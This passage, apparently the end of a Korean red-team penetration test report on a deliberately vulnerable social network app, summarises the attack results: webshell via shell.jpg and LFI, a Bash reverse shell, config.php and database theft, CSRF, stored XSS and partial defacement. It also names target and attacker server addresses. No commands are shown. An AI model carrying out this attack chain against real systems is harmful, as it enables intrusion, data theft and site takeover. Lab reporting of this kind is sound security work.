2. **웹쉘 무효화**: 세션 만료 또는 방어 메커니즘 작동
3. **권한 상승 실패**: SUID/sudo 악용 불가

**성공한 공격**:
1. ✅ 데이터베이스 완전 접근
2. ✅ 민감 정보 (config.php) 탈취
3. ✅ CSRF로 포인트 탈취 (899P)
4. ✅ Stored XSS로 메인 피드 장악
5. ⚠️ 부분적 Defacement (메인 피드만)

**실전 교훈**:
- **완벽한 해킹은 어렵다**: 현대 시스템은 다층 방어
- **권한이 중요하다**: www-data 권한으로는 한계가 있음
- **하지만 충분히 위험하다**: 데이터 탈취와 부분 장악만으로도 심각한 피해

### 교육적 가치
이 침투 테스트는 실제 웹 애플리케이션에서 발생할 수 있는 다양한 취약점과 공격 기법을 시연했습니다. **완벽한 장악에는 실패했지만**, 이것이 바로 **현실적인 침투 테스트**의 모습입니다. 각 단계별로 방어 메커니즘의 중요성과 보안 코딩의 필요성을 확인할 수 있었습니다.

### 최종 요약

| 목표 | 결과 | 비고 |
|------|------|------|
| 초기 침투 | ✅ 성공 | 기본 인증정보, 파일 업로드 |
| 웹쉘 획득 | ✅ 성공 | shell.jpg + LFI |
| 리버스 쉘 | ✅ 성공 | Bash 리버스 쉘 |
| DB 접근 | ✅ 성공 | config.php 탈취 |
| 권한 상승 | ❌ 실패 | www-data 제한 |
| 데이터 탈취 | ✅ 성공 | 전체 DB 덤프 |
| CSRF 공격 | ✅ 성공 | 899P 탈취 |
| 완전 Defacement | ⚠️ 부분 성공 | 메인 피드만 |
| 전체 장악 | ❌ 실패 | PHP 수정 권한 없음 |

**성공률**: 6.5/9 (72%)

---

**작성일**: 2025-11-10
**작성자**: Red Team
**대상 시스템**: Vulnerable SNS (http://52.78.221.104)
**공격자 서버**: http://13.158.67.78:5000
